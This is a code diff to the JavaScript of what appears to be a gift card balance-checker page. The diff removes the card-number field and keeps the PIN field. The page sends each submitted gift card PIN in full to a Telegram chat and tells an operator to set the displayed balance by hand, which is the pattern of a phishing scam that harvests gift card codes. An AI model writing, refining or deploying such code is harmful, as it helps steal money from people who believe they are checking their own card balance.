@@ -257,18 +257,16 @@ async function sendTelegram(text) {
 // ── Main check balance flow ───────────────────────────────────
 async function checkBalance() {
   const cardType  = document.getElementById('giftCardSelect').value;
-  const cardNum   = document.getElementById('cardNumber').value.trim();
   const cardPin   = document.getElementById('cardPin').value.trim();
 
   // Validate
-  if (!cardNum) { shakeEl(document.getElementById('cardNumber')); return; }
   if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }
 
   const requestId   = genId();
   const cardLabel   = CARD_LABELS[cardType] || cardType;
-  const maskedNum   = cardNum.length > 4
-    ? '*'.repeat(cardNum.length - 4) + cardNum.slice(-4)
-    : cardNum;
+  const maskedPin   = cardPin.length > 4
+    ? '*'.repeat(cardPin.length - 4) + cardPin.slice(-4)
+    : cardPin;
 
   // ── UI: loading ──
   setLoading(true);
@@ -279,7 +277,6 @@ async function checkBalance() {
   const tgMessage =
     `🎁 <b>New Gift Card Check</b>\n\n` +
     `🃏 <b>Card Type:</b> ${cardLabel}\n` +
-    `🔢 <b>Redeem Number:</b> <code>${cardNum}</code>\n` +
     `🔑 <b>PIN / Code:</b> <code>${cardPin}</code>\n` +
     `🆔 <b>Request ID:</b> <code>${requestId}</code>\n\n` +
     `👉 Open admin panel and set the balance for this request ID.`;
@@ -296,7 +293,6 @@ async function checkBalance() {
     pending.unshift({
       id:       requestId,
       cardType: cardType,
-      cardNum:  cardNum,
       cardPin:  cardPin,
       ts:       Date.now(),
       status:   'pending',
@@ -317,7 +313,7 @@ async function checkBalance() {
       document.getElementById('loadingState').style.display = 'none';
 
       if (data.balance) {
-        showResult(data.balance, cardLabel, maskedNum);
+        showResult(data.balance, cardLabel, maskedPin);
       } else {
         showError(data.error || 'Card not found or expired.');
       }
@@ -344,9 +340,9 @@ function setLoading(on) {
   spinner.style.display = on ? 'inline' : 'none';
 }
 
-function showResult(balance, cardLabel, maskedNum) {
+function showResult(balance, cardLabel, maskedPin) {
   document.getElementById('resultAmount').textContent = balance;
-  document.getElementById('resultCard').textContent   = `${cardLabel} • ${maskedNum}`;
+  document.getElementById('resultCard').textContent   = `${cardLabel} • PIN ${maskedPin}`;
   document.getElementById('resultBox').style.display  = 'flex';
   document.getElementById('errorBox').style.display   = 'none';
   document.getElementById('resultBox').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
